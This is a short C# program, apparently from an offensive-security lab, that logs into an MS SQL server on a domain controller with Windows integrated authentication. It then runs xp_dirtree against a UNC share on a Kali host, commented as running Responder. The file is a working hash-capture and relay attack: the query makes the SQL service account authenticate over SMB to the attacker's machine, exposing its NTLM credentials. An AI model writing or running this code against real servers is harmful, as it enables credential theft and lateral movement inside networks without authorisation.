using System;
using System.Data.SqlClient;

namespace SqlRelay
{
    class Program
    {
        static void Main(string[] args)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "dc01.corp1.com";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            //Kali IP where we are hosting responder for connection
            String query = "EXEC master..xp_dirtree \"\\\\192.168.49.84\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}